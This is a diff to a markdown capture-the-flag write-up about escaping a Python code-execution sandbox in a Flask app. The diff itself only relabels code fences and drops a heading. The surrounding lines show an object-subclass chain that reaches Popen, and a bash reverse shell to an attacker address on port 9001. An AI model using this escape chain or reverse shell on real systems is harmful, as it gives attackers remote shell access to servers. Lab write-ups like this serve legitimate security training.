@@ -53,7 +53,7 @@ While exploring and experimenting, I thought of using `globals()`, Python's buil
 
 The most valuable information that we noted was the following:
 
-```json
+```text
 origin='/home/app-production/app/app.py'
 
 'db': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>,
@@ -83,7 +83,7 @@ Another approach was to find what subclasses were available, to try to manipulat
     $'http://10.129.238.121:5000/run_code'`
 
 Breaking the above statement in small parts:
-```json
+```text
 * 1: This is an integer literal.
 * .__class__: This attribute returns the class of the integer, which is <class 'int'>.
 * .__bases__: This attribute returns a tuple of the base classes (superclasses) of <class 'int'>. For int, the base class is <class 'object'>.
@@ -121,8 +121,6 @@ Reverse shell w/ Bash:
 `(1).__class__.__bases__[0].__subclasses__()[317](["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.145/9001 0>&1"])`
 
 ![image_2025-03-25T16-24-40Z.png](i/image_2025-03-25T16-24-40Z.png)
-
-### Step 2
 
 Upon gaining access, we were on the server as the user `app-production` and we could look around to find valuable information. First, we checked the `app.py` file that seemed to have all the logic of the web application.
 In the first lines we could see that it was a Flask application that used an SQLite database that we knew from before.  
